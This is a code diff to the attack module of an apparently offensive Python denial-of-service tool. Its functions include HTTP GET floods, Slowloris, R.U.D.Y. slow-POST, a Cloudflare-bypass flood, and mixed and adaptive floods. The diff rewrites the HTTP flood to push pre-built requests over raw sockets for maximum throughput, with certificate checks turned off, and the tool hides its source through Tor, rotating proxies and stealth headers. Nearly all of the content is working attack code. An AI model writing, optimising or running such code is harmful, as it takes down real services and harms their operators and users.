@@ -10,7 +10,7 @@ from src.config import CONFIG
 # IP-HUNTER-SIGNATURE-NT-191q275zj684-riridori
 from src.utils.network import get_random_headers, generate_stealth_headers
 from src.utils.system import randomize_timing
-from src.security import decrement_thread_counter, stop_event
+import src.security
 from src.utils.logging import add_system_log
 
 async def async_http_flood(url, duration, proxies_list, monitor=None, max_requests=0, use_tor=False, stealth_mode=False):
@@ -20,14 +20,14 @@ async def async_http_flood(url, duration, proxies_list, monitor=None, max_reques
     end_time = time.time() + duration
 
     async def worker(session):
-        while time.time() < end_time and not stop_event.is_set():
+        while time.time() < end_time and not src.security.stop_event.is_set():
             if max_requests > 0 and monitor and monitor.packets_sent >= max_requests:
                 break
             try:
                 if use_tor:
                     proxy = CONFIG['TOR_PROXY']
                 else:
-                    proxy = random.choice(proxies_list) if proxies_list else None
+                    proxy = random.choice(proxies_list) if (proxies_list and len(proxies_list) > 0) else None
                 
                 headers = generate_stealth_headers() if stealth_mode else get_random_headers()
                 async with session.get(url, headers=headers, proxy=proxy, timeout=timeout) as response:
@@ -43,40 +43,72 @@ async def async_http_flood(url, duration, proxies_list, monitor=None, max_reques
         await asyncio.gather(*workers)
 
 def http_flood(url, duration, proxies=None, monitor=None, max_requests=0, use_tor=False, stealth_mode=False):
-    """Basic HTTP GET flood with proxy support"""
+    """Basic HTTP GET flood - Optimized for maximum PPS through raw socket requests where possible"""
     from src.security import increment_socket_counter, decrement_socket_counter
-    try:
-        end_time = time.time() + duration
-        session = requests.Session()
-        stealth_headers = generate_stealth_headers() if stealth_mode else None
+    import socket
+    import ssl
 
-        while time.time() < end_time:
-            if stop_event.is_set(): break
-            if max_requests > 0 and monitor and monitor.packets_sent >= max_requests:
-                break
+    end_time = time.time() + duration
+    parsed = urlparse(url)
+    host = parsed.hostname
+    port = parsed.port or (443 if parsed.scheme == "https" else 80)
+    path = parsed.path or "/"
+    if parsed.query: path += "?" + parsed.query
 
-            try:
-                increment_socket_counter()
-                if use_tor:
-                    proxy = {"http": CONFIG['TOR_PROXY'], "https": CONFIG['TOR_PROXY']}
-                else:
-                    proxy = {"http": random.choice(proxies), "https": random.choice(proxies)} if proxies else None
-                
-                headers = stealth_headers if stealth_mode else get_random_headers()
-                response = session.get(url, headers=headers, proxies=proxy, timeout=10)
+    # Pre-calculate payloads
+    headers = generate_stealth_headers() if stealth_mode else get_random_headers()
+    headers['Host'] = host
+    headers['Connection'] = 'keep-alive'
+    
+    header_str = f"GET {path} HTTP/1.1\r\n"
+    for k, v in headers.items():
+        header_str += f"{k}: {v}\r\n"
+    header_str += "\r\n"
+    payload = header_str.encode()
+
+    while time.time() < end_time and not src.security.stop_event.is_set():
+        if max_requests > 0 and monitor and monitor.packets_sent >= max_requests:
+            break
+
+        s = None
+        try:
+            increment_socket_counter()
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(3)
+            
+            if parsed.scheme == "https":
+                ctx = ssl.create_default_context()
+                ctx.check_hostname = False
+                ctx.verify_mode = ssl.CERT_NONE
+                s = ctx.wrap_socket(s, server_hostname=host)
+
+            s.connect((host, port))
+            
+            # Direct blast with error recovery
+            for _ in range(100):
+                if time.time() >= end_time or src.security.stop_event.is_set(): break
+                try:
+                    s.sendall(payload)
+                    # Don't wait for response, just keep pushing if PPS is the goal
+                    if monitor:
+                        monitor.update_stats(packets=1, bytes_sent=len(payload))
+                except (socket.error, BrokenPipeError):
+                    break # Socket closed, re-connect in outer loop
                 
                 if stealth_mode:
-                    randomize_timing()
-                if monitor:
-                    monitor.update_stats(packets=1, bytes_sent=len(response.content) if response.content else 0)
-            except Exception as e:
-                if monitor:
-                    monitor.update_stats(failed=1)
-                continue
-            finally:
-                decrement_socket_counter()
-    finally:
-        decrement_thread_counter()
+                    time.sleep(random.uniform(0.01, 0.03))
+
+        except Exception as e:
+            if monitor:
+                monitor.update_stats(failed=1)
+            time.sleep(0.2) # Avoid aggressive re-connect spam on failure
+        finally:
+            if s:
+                try: s.close()
+                except: pass
+            decrement_socket_counter()
+    
+    src.security.decrement_thread_counter()
 
 def slowloris_attack(target_ip, target_port, duration, socket_count=500):
     """Slowloris attack - keeps connections open with partial headers"""
@@ -114,14 +146,14 @@ def slowloris_attack(target_ip, target_port, duration, socket_count=500):
             
             # Use smaller sleep chunks and check stop_event
             for _ in range(15):
-                if time.time() >= end_time or stop_event.is_set():
+                if time.time() >= end_time or src.security.stop_event.is_set():
                     break
                 time.sleep(1)
     finally:
         for s in sockets:
             try: s.close()
             except: pass
-        decrement_thread_counter()
+        src.security.decrement_thread_counter()
 
 def cloudflare_bypass_flood(url, duration, proxies=None, monitor=None, max_requests=0, use_tor=False, stealth_mode=False):
     """HTTP flood with Cloudflare bypass techniques"""
@@ -191,7 +223,7 @@ def cloudflare_bypass_flood(url, duration, proxies=None, monitor=None, max_reque
                     monitor.update_stats(failed=1)
                 continue
     finally:
-        decrement_thread_counter()
+        src.security.decrement_thread_counter()
 
 def rudy_attack(url, duration, threads=50, monitor=None):
     """R-U-Dead-Yet? (R.U.D.Y) - Slow POST attack"""
@@ -366,7 +398,7 @@ def mixed_flood(url, duration, proxies=None, monitor=None):
     # 2. Slowloris Vector (Connection Exhaustion)
     def slowloris_swarm():
         end_loris = time.time() + duration
-        while time.time() < end_loris and not stop_event.is_set():
+        while time.time() < end_loris and not src.security.stop_event.is_set():
             try:
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 s.settimeout(4)
@@ -375,7 +407,7 @@ def mixed_flood(url, duration, proxies=None, monitor=None):
                 s.send(f"Host: {parsed.hostname}\r\n".encode())
                 s.send(f"User-Agent: {random.choice(CONFIG['USER_AGENTS'])}\r\n".encode())
                 s.send("\r\n".encode())
-                while time.time() < end_loris and not stop_event.is_set():
+                while time.time() < end_loris and not src.security.stop_event.is_set():
                     s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                     time.sleep(random.randint(10, 15))
             except:
@@ -400,7 +432,7 @@ def mixed_flood(url, duration, proxies=None, monitor=None):
         threads.append(t_udp)
 
     # Wait for completion
-    while time.time() < end_time and not stop_event.is_set():
+    while time.time() < end_time and not src.security.stop_event.is_set():
         time.sleep(1)
 
 def adaptive_flood(url, duration, proxies=None, monitor=None):
@@ -415,7 +447,7 @@ def adaptive_flood(url, duration, proxies=None, monitor=None):
     
     session = requests.Session()
     
-    while time.time() < end_time and not stop_event.is_set():
+    while time.time() < end_time and not src.security.stop_event.is_set():
         try:
             proxy = {"http": random.choice(proxies), "https": random.choice(proxies)} if proxies else None
             headers = generate_stealth_headers()
